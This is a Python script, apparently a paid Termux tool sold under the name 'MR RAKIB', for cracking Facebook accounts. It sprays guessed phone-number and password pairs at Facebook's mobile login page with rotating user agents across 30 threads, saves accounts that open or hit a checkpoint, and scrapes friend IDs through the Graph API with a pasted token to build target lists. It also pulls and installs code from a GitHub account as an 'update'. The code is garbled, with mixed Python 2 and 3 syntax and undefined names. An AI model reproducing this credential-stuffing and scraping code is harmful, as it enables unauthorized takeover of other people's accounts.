import os

try:

    import requests

except ImportError:

    print('\n [✓] installing requests !...\n')

    os.system('pip install requests')

try:

    import concurrent.futures

except ImportError:

    print('\n [✓] installing futures !...\n')

    os.system('pip install futures')

try:

    import bs4

except ImportError:

    print('\n [✓] installing bs4 !...\n')

    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib

from concurrent.futures import ThreadPoolExecutor as sarfrazssb

from datetime import datetime

from bs4 import BeautifulSoup

ct = datetime.now()

n = ct.month

bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']

try:

    if n < 0 or n > 12:

        exit()

    nTemp = n - 1

except ValueError:

    exit()

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

op = bulan[nTemp]

P = '\x1b[1;97m' # 

M = '\033[1;96m' # 

H = '\033[1;94m' # 

K = '\x1b[1;93m' # 

B = '\x1b[1;97m' # 

U = '\x1b[1;97m' # 

O = '\x1b[1;97m' # 

N = '\x1b[0m'    # 

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

data,data2={},{}

aman,cp,salah=0,0,0

ubahP,fuck,pwBaru=[],[],[]

ok = []

cp = []

id = []

user = []

loop = 0

url_lookup = "https://lookup-id.com/"

url_mb = "https://m.facebook.com"

url_ip = "https://www.httpbin.org/ip"

header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}

bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}

done = False

def jalan(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.01)

        

def main_apv():

    imt="110Y=="

    ak="RAKIB_100RS"

    os.system('clear')

    print(logo)

    try:

        key1=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'r').read()

    except IOError:

        os.system("clear")

        print(logo)

        print ("༄MR᭄•───────────────────────────────────────•༄RAKIB᭄")
        print ("YOUR TOKEN IS NOT APROVAL")     
        print ("         THIS IS YOUR TOKEN👇📥📬")
        print ("༄MR᭄•───────────────────────────────────────•༄RAKIB᭄")

        print ("")

        myid=uuid.uuid4().hex[:10].upper()

        print ("          YOUR KEY : "+ak+myid+imt)

        print ("༄MR᭄•───────────────────────────────────────•༄RAKIB᭄")

        kok=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'w')

        kok.write(myid+imt)

        kok.close()

        print ("")

        print ("")

        print ("  Copy Key And Sent Me WhatsApp Approvel Your Key ")

        print ("༄MR᭄•───────────────────────────────────────•༄RAKIB᭄")

        time.sleep(3.5)

        tks = 'Dear%20Admin,%20Please%20Approved%20My%20Token%20To%20Premium%20% 20% 20%20%20My%20%20Key%20%20:%20'+ak+''+myid+''+imt

        os.system('am start https://wa.me/+9660531382117?text=' + tks)

        

    r1=requests.get("https://github.com/MarkZuke-404/maximum.number-/blob/main/Server%20text").text

    if key1 in r1:

        R()

    else:

        os.system("clear")

        print(logo)

        print ("         ༄MR᭄•───────────────────────────────────────•༄RAKIB᭄")
        print ("             \033[1;94mGIVE ME 100RS FOR APROVAL Rakib")     
           
        print ("             \033[1;32mYOUR KEY : "+ak+key1)     
        print ("             Key And Sent Me WP Approvel Your Key ")
        print ("         ༄MR᭄•───────────────────────────────────────•༄RAKIB᭄")

        time.sleep(3.5)

        tks = 'Dear%20Admin,%20Please%20Apporved%20My%20Key%20To%20Premium✓✓%20%20%20%20%20My%20%20Key%20%20:%20'+ak+''+key1

        os.system('am start https://wa.me/+9660531382117?text=' + tks)

logo="""
 ########     ###    ##    ## #### ########  
##     ##   ## ##   ##   ##   ##  ##     ## 
##     ##  ##   ##  ##  ##    ##  ##     ## 
########  ##     ## #####     ##  ########  
##   ##   ######### ##  ##    ##  ##     ## 
##    ##  ##     ## ##   ##   ##  ##     ## 
##     ## ##     ## ##    ## #### ########  

        \033[1;92m༄MR᭄•───────────────────────────────────────•༄RAKIB᭄
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;95mAUTHOR   : MRRAKIB.              \033[1;93m                             
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : MRRAKIB                 \033[1;93m                            
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : MRRAKIB.            \033[1;93m                           
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +9660531382117 \033[1;93m                           
             \033[1;93m▇▇➣       \033[1;91mTHIS TOOL IS PAID                  \033[1;93m                           
             \033[1;93m▇▇➣   \033[1;94mGIVE ME 100RS FOR APRVAL  \033[1;93m                           
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
         \033[1;92m༄MR᭄•───────────────────────────────────────•༄RAKIB᭄
""" 
def hasil(OK,cp):

	if not len(OK) != 0:	    pass

	if len(cp) != 0:

	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/RAKIB-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/RAKIB-CP.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;97mPress enter to back Ahmad Menu ")

	    R()

		

def R():

			os.system("clear")

 

    print "\033[1;91m║--\033[1;91m> \033[1;93m1.\033[1;92m Public Cloning   \x1b[1;93m(Login)"
    print "\033[1;91m║--\033[1;91m> \033[1;9m2.\033[1;91m Random Cloning  \x1b[1;92m(No Login)"
    print "\033[1;94m║--\033[1;91m> \033[1;93m3.\033[1;93m File Making Menu\x1b[1;92m    (Login)"
    print "\033[1;94m║--\033[1;91m> \033[1;93m4.\033[1;91m Check Subscription "
    print "\033[1;94m║--\033[1;91m> \033[1;93m5.\033[1;92m Update Tools"
    print "\033[1;94m║--\033[1;91m> \033[1;93m6.\033[1;93m For Any Help Massage WhatsApp"
    print 43*'~'
    print "\x1b[1;92m[*] \x1b[1;91m For Need Any Help Type 7 And Massage Me On \x1b[1;92mWhatsApp "
    print 43*'~'
    main_input()
def main_input():
    mx=raw_input('\x1b[1;92m[!] Select : ')
    if mx=='1':
        print ""
        print('\033[1;91m Cheking Subscription ....\033[1;92m')
        time.sleep(3)
        fb_menu()
    elif mx=='2':
        print ""
        print('\033[1;91m Cheking Subscription ....\033[1;92m')
        time.sleep(3)
        numcloning()
    elif mx=='3':
        print ""
        os.system ('clear')
        print ("")
        print ("")
        print ("")
        print "        [ File Cloning ]"
        print ""
        print " [ cloning with pass or name + pass ]"
        print ""
        print "\033[1;94m║--\033[1;91m> \033[1;93m1.\033[1;92m With Choice Pass)"
        print "\033[1;94m║--\033[1;91m> \033[1;93m2.\033[1;91mCloning With Name + Pass)"
        print "\033[1;94m║--\033[1;91m> \033[1;93m3.\033[1;92m Cloning With Auto Pass"
        print "\033[1;94m║--\033[1;91m> \033[1;93m0.\033[1;95mBack"
        print ""
        c=raw_input("[!] Select : ")
        if c=='1':
            f_p_pass()
        elif c=='2':
            n_f_p_pass()
        elif c=="3":
            fileauto()
        else:
            main_system()
    elif mx=='4':
        print ""
        print('\033[1;94m Cheking Subscription ....\033[1;97m')
        time.sleep(3)
        grap()
    elif mx=='5':
    	os.system ('clear')
        print logo
        print ("")
        print ("")
        print ("")
        print ("")
        print ("        Congratulations Bro Your Pro")
        print ("        Member In Subhan Paid Commands ")
        print ("        ENJOY  KRO BHI LOGO ")
        time.sleep(3.5)
        main_system()
    elif mx=='6':
        os.system("git clone https://github.com/MarkZuke-404 ")
        os.system("rm -rf Paid")
        os.system("cp -f Paid/Paid \\.")
        os.system("rm -rf Paid")
        time.sleep(5)
        xox("\033[92;1m\n TOOL UPDATE SUCCESSFUL :)\n")
        time.sleep(2)
			
			
    elif mx=='7':
        os.system("xdg-open https://wa.me/+9660531382117")
        time.sleep(3)
        main_system()
        
        
    else:
        print ('invild option')
        time.sleep(2)
        main_system()


def numcloning():
    if dec in server:
        pass
    else:
        notf()
    ra=[]
    cps=[]
    oks=[]
    os.system ("clear")
    print logo
    print ""
    print    "    \033[1;91m\n[ Pakistan Random Number Cloning ]"
    
    print ""
    print ('\033[1;92m\n   [*] Enter First 4 Latter Of Any Network : ')
    print ("\033[1;93m\n     Example 0300  0345 0320 0303 ")
    print ""
    coc=raw_input ('\033[1;95m\nChoice Code :\033[1;93m ')
    try:
        list = '.txt'
        for li in open(list, 'r').readlines():
            ra.append(li.strip())
    except (KeyError, IOError):
        print ("File Missing")
        time.sleep (2)
        main_system()
    print ("")
    print "\033[1;93m\n[*] Total Ids : " +str(len(ra))
    print ""
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄RAKIB𝙧᭄"| lolcat')
    print "\033[1;93m CRACKING START PLEASE WAIT FOR IDS..   "
    print "\033[1;93m IF IDS NOT COMMING USE (airplane) FLIGHT MOD"
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄RAKIB𝙧᭄"| lolcat')
    def main(arg):
        user = arg
        lines = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			'Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
			'Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
        try:
            pass1 = user
            rana = requests.Session()
            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://mbasic.facebook.com')
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': coc+user, 'pass': pass1, 'login': 'submit'})
            
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[RAKIB-OK] "+coc+user + " | " + pass1
                ok=open('RAKIB-ok.txt', 'a')
                ok.write(cid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(cid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    
                    print "\x1b[1;92m[RAKIB-OK] "+coc+user + " | " + pass1
                    cp=open('RAKIB random-co.txt', 'a')
                    cp.write(cid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(cid+pass1)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, ra)
    print "\x1b[1;91m"
    print 40*'-'
    print "[!] Cloning Complete Been Completed ........"
    print 40*'-'
    print '[!] Total Ok Ids : ' +str(len(cps))
    print '[!] Total Cp Ids : ' +str(len(oks))
    print "\033[1;93m BAAKI NAAM TO SONA HOGAA [SUBHAN])"
    print 40*'-'
    print ''
    raw_input(' Press Enter To Back ')
    main_system()
    

def fb_menu():
    if dec in server:
        pass
    else:
        notf()
        
    try:
        token=open('token.txt','r').read()
    except:
        os.system('clear')
        print logo
        print 39*'-'
        print "\033[1;92m\n[1] Login With Token"
        print "\033[1;93m\n[0] Back"
        print 39*'-'
        pp=raw_input('\033[1;94m\nSelect :\033[1;91m ')
        if pp=='1':
            os.system('clear')
            print logo
            print "\033[1;91m\n[*] Enter Your Token Hear"
            print ''
            tok=raw_input('\033[1;92m\n[*]PASTE TOKEN :\033[1;97m ')
            j=open('token.txt','w')
            j.write(tok)
            j.close()
            try:
                r=requests.get('https://graph.facebook.com/me?access_token=' + tok)
                q=json.loads(r.text)
                m=q['name']
                print ''
                print ('WELCOME : '+m)
                time.sleep(2)
                fb_menu()
            except requests.exceptions.ConnectionError:
                print logo
                print ''
                print "Trun On Data An Then \t"
                print("")
            except:
                os.system ('clear')
                print ""
                print ""
                print ('\033[1;91m     Your Token Is Expire')
                time.sleep(3)
                os.system('rm -rf token.txt')
                main_system()
        else:
            main_system()
    os.system('clear')
    os.system('rm -rf file.txt')
    os.system('rm -rf newlinks.txt')
    print logo
    print   ""
    print 39*'-'
    print "\033[1;97m║--\033[1;91m> \033[1;91m1.\033[1;92m Public Cloning  [Pro]"
    print "\033[1;97m║--\033[1;91m> \033[1;91m2.\033[1;92m Public Cloning  [Fast]"
    print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;91m Back "
    print 39*'-'
    cz=raw_input('[!] Select : ')
    if cz=="1":
        print ""
        print "\033[1;91m      [ Public Cloning Pro ]"
        print ""
        print " [\033[1;93m cloning with pass or name + pass ]"
        print ""
        print "\033[1;92m[1] Cloning with password"
        print "\033[1;92m[2] Cloning with name + pass"
        print "\033[1;91m[0] Back"
        print ""
        c=raw_input("[!] Select : ")
        if c=='1':
            p_p_pass()
        elif c=='2':
            n_p_pass()
        else:
            fb_menu()
    elif cz=="2":
        print ""
        print "\033[1;92m      [ Public Cloning Fast ]"
        print ""
        print "\033[1;92m [ cloning with pass or name + pass ]"
        print ""
        print "\033[1;92m[1] Cloning With Choice Password"
        print "\033[1;92m[2] Cloning With Name + Pass"
        print "\033[1;92m[3] Cloning With Auto Pass"
        print "\033[1;91m[0] Back"
        print ""
        vv=raw_input("\033[1;95m[!] Select :\033[1;92m ")
        if vv=="1":
            xokp()
        elif vv=="2":
            xoknp()
        elif vv=="3":
            xokpauto()
        else:
            fb_menu()
    elif cz=="v":
        os.system('clear')
        print logo
        print ""
        print ""
        print "\t     [ File Making ]"
        print ""
        print "\t  [ Maximum Limit 10 IDs ]"
        print ""
        c=raw_input("[!] How Many Links Do You Want To Dump : ")
        if c=='1':
            ext1()
        elif c=='2':
            ext2()
        elif c=='3':
            ext3()
        elif c=='4':
            ext4()
        elif c=='5':
            ext5()
        elif c=='6':
            ext6()
        elif c=='7':
            ext7()
        elif c=='8':
            ext8()
        elif c=='9':
            ext9()
        elif c=='10':
            ext10()
        else:
            fb_menu()
    elif cz=="4":
        mineExt()
    else:
        main_system()


def mineExt():
    hok=('jok.txt')
    count=[]
    rana=[]
    try:
        token=open('token.txt','r').read()
    except:
        fb_menu()
    os.system('clear')
    print logo
    print ""
    iiid=raw_input("[=] Enter ID : ")
    rrp=requests.get ("https://graph.facebook.com/"+iiid+"?access_token="+token)
    q=json.loads(rrp.text)
    nid=q ['name']
    r = requests.get('https://graph.facebook.com/' + iiid + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("look.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    print ""
    print sm+"[=] Extracting From : "+nid+" > \x1b[1;91mFriends"
    print ""
    time.sleep(2)
    print gu+"[=] Graping URLs ......"+w
    print ""
    time.sleep(2)
    print g+"[=] Graping Complte Process Start *"+w
    print ""
    os.system(' cat look.txt | grep "10000" >> kk.txt')
    os.system(' cat look.txt | grep "1000" >> kk.txt')
    os.system('rm -rf look.txt')
    file=open('kk.txt')
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SUBHAN : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From RAKIB : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From RAKIB : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From RAKIB : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From RAKIB : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From RAKIB : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From RAKIB : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From RAKIB : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From RAKIB : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From RAKIB : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From RAKIB : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From RAKIB : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From RAKIB : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From RAKIB : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From RAKIB : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From RAKIB : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From RAKIB  : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From RAKIB : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From RAKIB : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    print ""
    print ""
    print sm+"[=] Total Extract ids : "+str(len(count))+w
    print ""
    mvt=raw_input("[=] Enter Path To Save File : ")
    print "[=] Your File Save in : "+mvt
    shutil.move(hok,mvt)
    os.system('rm -rf jok.txt')
    raw_input('[=] Press Enter To Back')
    fb_menu()
